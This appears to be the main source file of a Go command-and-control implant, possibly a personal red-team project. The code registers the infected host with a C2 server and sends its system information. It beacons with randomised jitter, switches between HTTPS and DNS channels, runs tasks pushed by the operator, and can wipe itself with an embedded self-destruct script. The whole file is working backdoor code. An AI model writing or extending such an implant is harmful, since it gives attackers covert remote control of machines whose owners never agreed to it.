package main

import (
	"bytes"
	_ "embed"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"time"
	"os/exec"

	"asritha.dev/implant/pkg/c2communicator"
	"asritha.dev/implant/pkg/task"
)

//go:embed self-destruct.sh
var selfDestruct string

type ImplantConfig struct {
	Dwell  string  `json:"dwell"` // base interval time between C2 beacon check-ins (e.g., “5m” for a five-minute dwell before adding jitter)
	Jitter float64 `json:"jitter"`
}

type Implant struct {
	ID     uint           `json:"id"`
	Config *ImplantConfig `json:"config"`
	SystemInfo
	TaskQueue *task.Queue
	Results   []task.Result
	c2communicator.C2Communicator
}

// NewImplant instantiates an Implant, registers it, and wires up its communicator.
func NewImplant() (*Implant, error) {
	impl := &Implant{
		SystemInfo: GetSystemInfo(),
		TaskQueue:  task.NewQueue(),
	}

	protocol, err := impl.register()
	if err != nil {
		return nil, fmt.Errorf("implant registration failed: %w", err)
	}

	if err = impl.NewC2Communicator(protocol); err != nil {
		return nil, fmt.Errorf("c2communicator creation failed: %w", err)
	}
	return impl, nil
}

// register contacts the /register, fills impl.ID, and returns the c2's chosen communication protocol
func (i *Implant) register() (string, error) {
	// TODO: should be http://
	endpoint := "http://" + C2Domain + C2RegisterEndpoint
	body, err := json.Marshal(i)
	if err != nil {
		return "", fmt.Errorf("marshal payload: %w", err)
	}

	req, err := http.NewRequest(http.MethodPost, endpoint, bytes.NewReader(body))
	if err != nil {
		return "", fmt.Errorf("create request: %w", err)
	}
	req.Header.Set("Content-Type", "application/json")

	// TODO: this is bad, should not be using http.DefaultClient, when already creating a client in HTTPS listener. should register depending on if it can reach HTTPS, else do DNS
	resp, err := http.DefaultClient.Do(req) // PLZ give me https communicator
	if err != nil {
		return "", fmt.Errorf("do request: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusCreated {
		data, _ := io.ReadAll(resp.Body)
		return "", fmt.Errorf("unexpected status %s: %s", resp.Status, string(data))
	}

	var out struct {
		ID           uint           `json:"id"`
		CommProtocol string         `json:"comm_protocol"`
		Config       *ImplantConfig `json:"config"`
	}
	if err = json.NewDecoder(resp.Body).Decode(&out); err != nil {
		return "", fmt.Errorf("decode response: %w", err)
	}

	i.ID = out.ID
	i.Config = out.Config
	return out.CommProtocol, nil
}

// NextBeaconInterval computes the next beacon delay by applying up to ±Jitter
// around the base Dwell interval. The result is a uniformly random duration
// between Dwell×(1−Jitter) and Dwell×(1+Jitter).
//
// For example, if Dwell = 5*time.Minute and Jitter = 0.2, the returned duration
// will be chosen uniformly from [4m, 6m)./
func (i *Implant) NextBeaconInterval() time.Duration {
	// compute lower + upper
	minFactor := 1.0 - i.Config.Jitter
	maxFactor := 1.0 + i.Config.Jitter

	// pick a random float in [minFactor, maxFactor)
	factor := minFactor + rand.Float64()*(maxFactor-minFactor)

	// scale dwell by the factor and return
	d, _ := time.ParseDuration(i.Config.Dwell) // TODO: handle error, rename
	return time.Duration(float64(d) * factor)
}

// BeaconLoop continuously sleeps for a jittered Dwell interval and then calls Beacon().
func (i *Implant) BeaconLoop() error {
	for {
		fmt.Println("Starting beacon...")
		delay := i.NextBeaconInterval()
		time.Sleep(delay)

		// perform beacon
		// TODO: instead of returning Queue, error, should return Queue, malformedTasks []Task -> then use those to create a result
		var err error // why need this
		i.TaskQueue, err = i.C2Communicator.Beacon(i.ID, i.Results)
		if err != nil {
			return nil
		}
		i.Results = make([]task.Result, 0) // flush old results
		i.ExecuteTasks()
	}
}

func (i *Implant) UpdateConfig(newJitter float64, newDwell, newC2CommProtocol string) error {
	if newJitter != 0 {
		i.Config.Jitter = newJitter

	}
	if newDwell != "" {
		i.Config.Dwell = newDwell
	}
	if newC2CommProtocol != "" {
		if err := i.NewC2Communicator(newC2CommProtocol); err != nil {
			return err
		}
	}
	return nil
}

func (i *Implant) NewC2Communicator(protocol string) error {
	var comm c2communicator.C2Communicator
	switch protocol {
	case "HTTPS":
		comm = c2communicator.NewHTTPS(C2Domain, C2HTTPSBeaconEndpoint)
	case "DNS":
		comm = c2communicator.NewDNS()
	default:
		return fmt.Errorf("unsupported protocol: %s", protocol)
	}
	i.C2Communicator = comm
	return nil
}

func (i *Implant) ExecuteTasks() {
	for !i.TaskQueue.IsEmpty() {
		raw := i.TaskQueue.Dequeue()

		// Configure tasks are handled specially, their default Do() function is not used
		var result task.Result
		if cfgTask, ok := raw.(*task.Configure); ok {
			err := i.UpdateConfig(cfgTask.NewJitter, cfgTask.NewDwell, cfgTask.NewC2CommProtocol)
			if err != nil {
				result = task.Result{
					Content: err.Error(),
					Success: false,
				}
			} else {
				result = task.Result{
					Success: true,
				}
			}
		} else {
			result = raw.Do()
		}

		result.TaskID = raw.GetID()
		i.Results = append(i.Results, result)
	}
}

func (i *Implant) SelfDestruct() error {
	return exec.Command("/bin/sh", "-c", selfDestruct).Run()
}
